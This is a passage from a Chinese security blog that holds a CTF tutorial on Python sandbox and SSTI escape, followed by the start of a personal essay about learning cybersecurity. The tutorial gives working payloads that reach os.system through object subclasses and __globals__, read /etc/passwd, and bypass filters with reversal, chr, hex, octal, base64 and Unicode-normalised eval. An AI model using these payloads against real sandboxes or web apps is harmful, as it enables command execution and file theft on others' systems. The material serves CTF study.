#python2<br>system(“whoami”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>commands<blockquote>\n<blockquote>\n<blockquote>\n<p>import commands    #python2<br>commands.getstatusoutput(“whoami”)<br>(0, ‘ydj’)</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>commands.getoutput(“whoami”)<br>‘ydj’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>importlib（imp）<blockquote>\n<blockquote>\n<blockquote>\n<p>import importlib<br>importlib.import_module(“os”).system(“whoami”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>importlib.<strong>import</strong>(“os”).system(“whoami”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>timeit<blockquote>\n<blockquote>\n<blockquote>\n<p>import timeit<br>timeit.timeit(“<strong>import</strong>(‘os’).system(‘whoami’)”,number&#x3D;1)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>platform<blockquote>\n<blockquote>\n<blockquote>\n<p>import platform<br>platform.os.system(“whoami”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>pdb<blockquote>\n<blockquote>\n<blockquote>\n<p>import pdb<br>pdb.os.system(“whoami”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>subprocess<blockquote>\n<blockquote>\n<blockquote>\n<p>import subprocess<br>subprocess.call(“whoami”, shell&#x3D;True)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>subprocess.Popen(“whoami”, shell&#x3D;True)<br>&lt;Popen: returncode: None args: ‘whoami’&gt;<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>自建模块导入</li>\n</ul>\n<p>#hack.py<br>import os<br>os.system(“whoami”)</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>import hack<br>ydj<br>3. 通过继承关系逃逸（SSTI常考）<br>3.1 多重继承特性<br>与java等语言不同，python支持多重继承，这意味着一个子类可以拥有多个父类，这个特性是造成逃逸的关键，下面先来引入几个知识点（可以把他们理解为一个可以用 . 号调用的方法）</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li><strong>class</strong> ：返回对象所属的类<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong><br>&lt;class ‘str’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li><strong>mro</strong> ：返回类的继承顺序<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>mro</strong><br>(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li><strong>base</strong> ：以字符串返回一个类所直接继承的类<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>base</strong><br>&lt;class ‘object’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li><strong>bases</strong> ：以元组的形式返回一个类所直接继承的类<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>bases</strong><br>(&lt;class ‘object’&gt;,)</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li><strong>subclasses</strong>() ：获取类的所有子类<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>subclasses</strong>()<br>[&lt;enum ‘StrEnum’&gt;]</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()    #object类的所有子类<br>[&lt;class ‘type’&gt;, &lt;class ‘async_generator’&gt;, &lt;class ‘bytearray_iterator’&gt;, &lt;class ‘bytearray’&gt;, &lt;class ‘bytes_iterator’&gt;, &lt;class ‘bytes’&gt;, &lt;class ‘builtin_function_or_method’&gt;, &lt;class ‘callable_iterator’&gt;, &lt;class ‘PyCapsule’&gt;, &lt;class ‘cell’&gt;, &lt;class ‘classmethod_descriptor’&gt;, &lt;class ‘classmethod’&gt;, &lt;class ‘code’&gt;, &lt;class ‘complex’&gt;, &lt;class ‘_contextvars.Token’&gt;, ……]<br>在python2中可以直接利用file读写文件<br>[].<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[40]<br>&lt;type ‘file’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>[].<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()<a href=\"'/etc/passwd'\">40</a>.read()<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\\n ……’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li><strong>init</strong> ：所有自带类都包含init方法，便于利用他当跳板来调用globals</li>\n<li><strong>globals</strong> ：配合__init__获取函数所处空间下可使用的module、方法以及所有变量<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[192].<strong>init</strong>.<strong>globals</strong><br>{‘<strong>name</strong>‘: ‘contextlib’, ‘<strong>doc</strong>‘: ‘Utilities for with-statement contexts.  See PEP 343.’, ‘<strong>package</strong>‘: ‘’, ‘<strong>loader</strong>‘: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f5bbb592a10&gt;, ‘<strong>spec</strong>‘: ModuleSpec(name&#x3D;’contextlib’, loader&#x3D;&lt;_frozen_importlib_external.SourceFileLoader object at 0x7f5bbb592a10&gt;, ……}</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[192].<strong>init</strong>.<strong>globals</strong>[“os”]<br>&lt;module ‘os’ (frozen)&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li><strong>dict</strong> ：用来存储对象属性的一个字典，其键为属性名，值为属性的值<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>dict</strong><br>mappingproxy({‘<strong>new</strong>‘: &lt;built-in method __new__ of type object at 0x958980&gt;, ‘<strong>repr</strong>‘: &lt;slot wrapper ‘__repr__’ of ‘str’ objects&gt;, ‘<strong>hash</strong>‘: &lt;slot wrapper ‘__hash__’ of ‘str’ objects&gt;, ‘<strong>str</strong>‘: &lt;slot wrapper ‘__str__’ of ‘str’ objects&gt;, ‘<strong>getattribute</strong>‘: &lt;slot wrapper ‘__getattribute__’ of ‘str’ objects&gt;, ‘<strong>lt</strong>‘: &lt;slot wrapper ‘__lt__’ of ‘str’ objects&gt;, ‘<strong>le</strong>‘: &lt;slot wrapper ‘__le__’ of ‘str’ objects&gt;, ……})</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>dict</strong>[‘<strong>str</strong>‘]<br>&lt;slot wrapper ‘__str__’ of ‘str’ objects&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>__builtin__、builtins、__builtins__：python内建模块，内含不需要import导入就能使用的函数。在2.x中，为__builtin__，在3.x中，则为builtins，而__builtins__为两者都有的模块，前两者需要import，后者不用<blockquote>\n<blockquote>\n<blockquote>\n<p>import <strong>builtin</strong>    #python2<br>dir(<strong>builtin</strong>)<br>[‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BufferError’, ‘BytesWarning’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EnvironmentError’, ‘Exception’, ‘False’, ‘FloatingPointError’, ‘FutureWarning’, ‘GeneratorExit’, ‘IOError’, ‘ImportError’, ‘ImportWarning’, ‘IndentationError’, ‘IndexError’, ‘KeyError’, ‘KeyboardInterrupt’, ‘LookupError’, ‘MemoryError’, ……]<br>import builtins    #python3<br>dir(builtins)<br>[‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BaseExceptionGroup’, ‘BlockingIOError’, ‘BrokenPipeError’, ‘BufferError’, ‘BytesWarning’, ‘ChildProcessError’, ‘ConnectionAbortedError’, ‘ConnectionError’, ‘ConnectionRefusedError’, ‘ConnectionResetError’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EncodingWarning’, ‘EnvironmentError’, ‘Exception’, ‘ExceptionGroup’, ……]<br>dir(<strong>builtins</strong>)    #both<br>[‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BaseExceptionGroup’, ‘BlockingIOError’, ‘BrokenPipeError’, ‘BufferError’, ‘BytesWarning’, ‘ChildProcessError’, ‘ConnectionAbortedError’, ‘ConnectionError’, ‘ConnectionRefusedError’, ‘ConnectionResetError’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EncodingWarning’, ‘EnvironmentError’, ‘Exception’, ‘ExceptionGroup’, ……]<br>可以通过内建模块配合__dict__进行文件读写和命令执行<br><strong>builtins</strong>.<strong>dict</strong><a href=\"%22/etc/passwd%22\">“open”</a>.read()<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\\n ……’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p><strong>builtins</strong>.<strong>dict</strong><a href=\"'os'\">‘<strong>import</strong>‘</a>.system(‘whoami’)<br>ydj<br>3.2 整体逃逸思路<br>结合以上知识点，我们已经可以进行一个基础的逃逸攻击（此处演示用的python3.11）</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>先通过__class__获取一个类，什么类型都可以，因为我们目的是为了获取object基类，而python中所有类都继承于object基类<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong><br>&lt;class ‘str’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>[].<strong>class</strong><br>&lt;class ‘list’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>然后通过bases或者mro来获取到object基类<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>base</strong><br>&lt;class ‘object’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>mro</strong>[1]<br>&lt;class ‘object’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li><p>然后获取object的子类</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<br>[&lt;class ‘type’&gt;, &lt;class ‘async_generator’&gt;, &lt;class ‘bytearray_iterator’&gt;, &lt;class ‘bytearray’&gt;, &lt;class ‘bytes_iterator’&gt;, &lt;class ‘bytes’&gt;, &lt;class ‘builtin_function_or_method’&gt;, &lt;class ‘callable_iterator’&gt;, &lt;class ‘PyCapsule’&gt;, &lt;class ‘cell’&gt;, &lt;class ‘classmethod_descriptor’&gt;, &lt;class ‘classmethod’&gt;, &lt;class ‘code’&gt;, &lt;class ‘complex’&gt;, &lt;class ‘_contextvars.Token’&gt;, ……]</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li><p>然后利用__init__.__globals__爆破有可以利用的类（比如有file函数，os模块等可以文件读写和命令执行的类）<br>做题的时候用burp爆破比较方便，由于我这里是本地演示的，没有题目环境，就写个脚本爆吧<br>#burp.py<br>for i in range(0,300):<br>  try:<br>  j&#x3D;eval(f”[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[{i}].<strong>init</strong>.<strong>globals</strong>“)<br>  if ‘os’ in j:<br>      print(i)<br>  except Exception:    #运行过程会产生报错，pass就好了<br>  pass<br><img src=\"/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20231106050102272.png\" alt=\"image-20231106050102272\"></p>\n</li>\n<li><p>最终payload</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[144].<strong>init</strong>.<strong>globals</strong>[“os”].system(‘whoami’)<br>ydj<br>0x03 waf绕过姿势<br>这里我不针对单一的防护进行绕过，因为在CTF中的waf往往都是要结合多种姿势才能绕过，所以我会尽可能多的总结出各种姿势，到时候遇到waf就可以从这里面灵活的结合各种方法进行绕过。</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<ol>\n<li>双写<br>这个大家应该都知道吧</li>\n<li>逆转<blockquote>\n<blockquote>\n<blockquote>\n<p><strong>import</strong>(‘so’[::-1]).system(‘whoami’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>拼接<blockquote>\n<blockquote>\n<blockquote>\n<p><strong>import</strong>(‘o’+’s’).system(‘whoami’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ol>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>a&#x3D;’o’<br>b&#x3D;’s’<br><strong>import</strong>(a+b).system(‘whoami’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>如果有实际环境可以利用request.args（flask中一个存储着请求参数以及其值的字典）绕过引号<br>?payload&#x3D;[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[144].<strong>init</strong>.<strong>globals</strong>[request.args.a].system(request.args.b)&amp;a&#x3D;os&amp;b&#x3D;whoami</li>\n</ul>\n<ol start=\"4\">\n<li>逆转结合eval、exec<blockquote>\n<blockquote>\n<blockquote>\n<p>exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ol>\n<ul>\n<li>要是过滤了eval、exec，可以这样利用python3解释的特性（python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化）<blockquote>\n<blockquote>\n<blockquote>\n<p>ᵉval(‘<strong>import</strong>(“os”).system(“whoami”)’)    #python3<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<ol start=\"5\">\n<li>编码</li>\n</ol>\n<p>#decode利用</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p><strong>import</strong>(“bf”.decode(‘rot_13’)).system(“jubnzv”.decode(‘rot_13’))    #python2<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>#byte</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>print(bytes(range(32,127)))<br>b’ !”#$%&amp;&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_&#96;abcdefghijklmnopqrstuvwxyz{|}~’<br><strong>import</strong>(“os”).system(bytes([119, 104, 111, 97, 109, 105]))<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>#chr</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p><strong>import</strong>(chr(111)+chr(115)).system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>#oct</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>exec(“\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\163\\17<br>1\\163\\164\\145\\155\\50\\47\\167\\150\\157\\141\\155\\151\\47\\51”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>#hex</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>eval(“\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x<br>73\\x79\\x73\\x74\\x65\\x6d\\x28\\x27\\x77\\x68\\x6f\\x61\\x6d\\x69\\x27\\x29”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>#base64</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>exec(<strong>import</strong>(‘base64’).b64decode(‘X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3dob2FtaScp’))<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>##only python2</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>exec(‘X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3dob2FtaScp’.decode(“base64”))<br>ydj<br>6. 字符截取<br>先找一个返回结果包含我们所需字母的，这里我们选择().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<br>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<br>[&lt;class ‘type’&gt;, &lt;class ‘async_generator’&gt;, &lt;class ‘bytearray_iterator’&gt;, &lt;class ‘bytearray’&gt;, &lt;class ‘bytes_iterator’&gt;, &lt;class ‘bytes’&gt;, &lt;class ‘builtin_function_or_method’&gt;, &lt;class ‘callable_iterator’&gt;, &lt;class ‘PyCapsule’&gt;, &lt;class ‘cell’&gt;, &lt;class ‘classmethod_descriptor’&gt;, &lt;class ‘classmethod’&gt;, &lt;class ‘code’&gt;, &lt;class ‘complex’&gt;, &lt;class ‘_contextvars.Token’&gt;, &lt;class ‘_contextvars.ContextVar’&gt;, &lt;class ‘_contextvars.Context’&gt;, &lt;class ‘coroutine’&gt;, ……]<br>然后利用str()+[]截取字符，如下<br>str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38]<br>‘o’<br>str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5]<br>‘s’<br>有时候要找的字母太靠后，还要一个一个数，不够优雅，这时候我们可以利用ord()+chr()来字符自增，比如获取了s的位置，就可以利用ascii码来计算其他的<br>chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5])+6)<br>‘y’<br>最终payload<br><strong>import</strong>(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38]+str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5]).system(chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5])+4)+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-7)+str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38]+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-14)+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-2)+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-6))<br>ydj<br>7. dict取键<br>list(dict(whoami&#x3D;1))[0]<br>‘whoami’<br>str(dict(whoami&#x3D;1))[2:8]<br>‘whoami’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p><strong>import</strong>(“os”).system(str(dict(whoami&#x3D;1))[2:8])<br>ydj<br>8. getattr<br>用于返回对象属性值<br>getattr(getattr(<strong>builtins</strong>, ‘<strong>tropmi</strong>‘[::-1])(‘so’[::-1]), ‘metsys’[::-1])(‘whoami’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>getattr(<strong>import</strong>(‘types’).<strong>builtins</strong><a href=\"'so'%5B::-1%5D\">‘<strong>tropmi</strong>‘[::-1]</a>, ‘mets’ ‘ys’[::-1])(‘whoami’)    #结合types库<br>ydj<br>9. pop+<strong>getitem</strong><br>pop：用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值<br>__getitem__：返回所给键对应的值。当对象是序列时，键是整数。当对象是映射时（字典），键是任意值<br>两者结合可用于[]给过滤的情况<br>‘’.<strong>class</strong>.<strong>mro</strong>.<strong>getitem</strong>(2)<br>&lt;type ‘object’&gt;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>‘’.<strong>class</strong>.<strong>mro</strong>.<strong>getitem</strong>(2).<strong>subclasses</strong>().pop(59).<strong>init</strong>.func_globals.get(‘linecache’).os.popen(‘whoami’).read()    #python2<br>‘ydj\\n’<br>10. f-string特性<br>python&gt;&#x3D;3.6<br>f’{<strong>import</strong>(“os”).system(“whoami”)}’<br>ydj<br>11. <strong>call</strong><br>一般情况下类方法的调用是通过先创建类对象再通过a.b()的方式来调用，但是如果类中只有一个方法或者一个方法的使用频率非常高，那么就可以为这个方法命名为__call__来简化调用<br>“”.<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()[29].<strong>call</strong>(eval, ‘<strong>import</strong>(“os”).system(“whoami”)’)<br>ydj<br>12. 数字获取<br>ord(‘b’)-ord(‘a’)    #以此类推<br>1</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>len([])<br>0<br>len([[],[]])    #以此类推<br>2</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>还有很多思路，就不一一列举<br>0x04总结<br>沙箱逃逸是一个有很多细节的考点，各种函数的结合利用，各类python不同的版本的特性，除了我总结的这些外，还有更多高级玩法，师傅们也可以多去看看大佬们的文章（看大佬的文章总是能有所收获）</p>\n","categories":["CTF","WEB"],"tags":["Python沙箱逃逸"]},{"title":"我与网安","url":"/2023/11/05/%E6%88%91%E4%B8%8E%E7%BD%91%E5%AE%89/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<p>​\t本人是网络空间安全专业的学生，在网络安全的学习道路上已经摸爬滚打了两年，这里以高考后的暑假开始计算的，到这个暑假，刚好两年。两年学习下来，我没有成为CTF大神，也并不是网络攻防专家。啥都学了一点点，却没有一样是精通的，相比于大家眼中可能是“很牛”的网络安全科班生，我更像一个脚本小子，只会“一把梭”。我想，可能这才是很多普通网安人的样子吧。</p>\n<span id=\"more\"></span>\n\n<p>​\t我并不是高考后才了解了网络安全这一专业。和许多师傅们一样，我从小到大就受到影视剧中“黑客”这一形象的感染，我觉得“横行”网络世界的黑客们优雅而又神秘，给我一种“万花丛中过，片叶不沾身”的侠客情怀，这也在我心中埋下了向往的种子，emm…..，仅仅是向往而已，因为每当我打开电脑的时候，更吸引我的还是各种各样的游戏，尤其是初高中，我更是一度沉迷手机游戏而无法自拔。所以到现在为止对于那些从小就开始敲代码研究计算机的师傅我都是既羡慕又崇拜，或许这就是我和高手的差距之一吧。</p>\n<p>​\t在我高二日常不想学习的时候，我就会憧憬未来，于是乎就开始翻找一些大学专业，看看有没有什么有趣的，而在添加了关键字“薪资排行”之后，我发现了“信息安全”这一专业，当我进一步了解它时，我不禁惊呼：哇去，这特喵好像黑客啊！而在搜索的过程，我又发现了“网络空间安全专业”，我直接大喊：哇去，这特喵就是黑客啊！而且，好像平均薪资也好高啊！于是乎，“非信息安全和网络空间安全不选”成为了我心中的一个执念，所以在打王者之余，我还经常去百度，b站或者抖音等地方疯狂搜索：如何成为一名黑客、黑客学习路线、黑客需要掌握什么技能等等，emm……，就是这么搞笑哈哈哈，混迹网安多年的师傅们都知道，这么搜出来的东西大多数都是黑客面具加绿色代码雨之类的东西。不能说毫无作用，简直是屁用没有。</p>\n<p>​\t这样的状态持续到了高考后，不出意外的话，要出意外了。没错，我考砸了，合情合理，又不是什么天才少年，整天不学习就想着打游戏能考出个花来，广东省的490，只能读个普通2a。我本想着报个普通2a的计算机也行，可以自学网络安全的。而现实却给我当头一棒，给调剂到XX学院的土木工程去了，不是我专业歧视，而是我要是去读了，那这辈子别说网络安全了，连计算机可能都碰不太上了。于是，我复读了。但是，复读并没有使我开始认真学习，我依旧打游戏，摆烂。也是这一段经历使我明白了我这种人对于不喜欢的事物是不可能坚持的下去的，所以信息安全和网络空间安全是非上不可了，不然这辈子可能就这样了。然而，我还是没有好好学习……。不过值得一提的是，我虽然没有自己的电脑，但是我复读的这一年了解到了Termux（一个可以在安卓上运行Linux甚至安装kali的app），虽然捣鼓了一段时间也没学到什么，但是运行命令或者跑脚本这些”黑客操作“极大的满足了我对网安的好奇心。ok，第二次高考结束，比去年多了个四五十分，勉强过了一本线，却报不上一些我认识的有网安信安的省内高校，强行填报极有可能给调剂到其他专业，这是我不能接受的。正当我进退两难之际，之前的老同学告诉我她的学校也有网安专业，只不过刚办了一年而已，我一听直接来了兴致，看了一下虽然也是个普通2a，但是我的分数起码能稳稳拿下网安，于是我直接第一学校第一专业给它填上了志愿。也不出意料的给录取了，那一刻，又一个网安人的命运齿轮开始了转动……</p>\n<p>​\t在确认自己给学校的网安成功收留了之后，买了台轻薄本，就开始疯狂的找各种网安教程（此时已不在是只会搜”如何成为一名黑客了“），当时也是在b站看到了迪总的课，但是捏，当时年轻气盛，只想速成，这么长的视频要学到啥时候，于是直接跳过了我迪总的课，现在依旧悔不当初。在看了”海量“的速成课之后，ok，除了很多东西混个眼熟之外，还是啥也不会，外加上学院组织我们提前学一下C语言，暑假的后半段又跑去学C语言去了（中间还装了一下kali、burp什么的，装一个花好几天哈哈哈）。看起来我是磕磕绊绊，寥寥草草的步入了网安的大门，而现在回想起来，这些经历都对我的网安学习有着很大的推进作用。</p>\n<p>​\t大一开学，在发现自己的计算机专业课只有一个C语言时，我决定开始自学。由于我们学院是刚刚成立一年，我们上面只有大二的师兄师姐，而且老师有很多都是从计科院调过来的，网络安全的专业性客观来说不是很强，所以我们这两届学生注定是要自己摸爬滚打的。再经历了暑假的”速成“打击后，我开始意识到系统学习的重要性，于是我最终锁定了最受好评的迪总的b站免费课，开始了进一步的学习，边学边跟着操作，理解不了的就跑去看其他的视频或文章，渐渐的在脑海里也对网络安全（严格来说是Web安全）有了初步框架，这份热情也持续了挺久的（对我来说），直到学完了Web漏洞这一块，我彻底失去了耐心，这么长的课对我这种坐不太住的人就是一个折磨，也是从这个时候开始，我遇到问题更倾向于查看文章类型的资料或者是针对性的视频，很少再去看很长的系统学习视频了，我自己认为这应该是一个错误的做法。</p>\n<p>​\t熟悉了漏洞原理之后，我开始踏入了CTF的道路，主攻Web方向。每次拿到flag并且提交成功的快感并不亚于游戏直线上分。于是我便开始了近乎疯狂的刷题，这也成为了除游戏之外第二个能让我废寝忘食的事情，从基础入门到绕各种waf，我乐此不疲。在实力提升的同时，也尝试着去参加各种各样的比赛，不得不说，CTF的比赛真的挺多的。然后也是在大一下参加了全国大学生信息安全竞赛拿了个分区二等奖，”蓝帽杯“拿了个国三，还有一些杂七杂八的。我在网上看到很多人都说CTF没啥用，实战用不上。而在这里我可以十分肯定的告诉大家，打CTF的这段时间是我进步最快的时候，因为打CTF其实是一个进一步理解漏洞原理并加以利用的过程，而我在学渗透测试和红蓝对抗跟多的是学习工具的使用和理清思路（当然这也是我比较菜的原因），所以CTF锻炼了我信息收集和解决问题的能力，也让我跟好的理解了漏洞原理，对我未来实战的发展带来不少益处。</p>\n<p>​\t在大二上学期的一段时间中，我发现我的CTF学习似乎到达了一个瓶颈，简单的题都能做，而稍微难一点就感觉十分困难。我慢慢的开始感觉到可能是我代码基础的问题，这也是最让我头疼的地方，因为我是一个对编程无感的人（不知道有没有师傅和我一样），看着一大段代码我就头疼，而CTF的进阶，代码审计是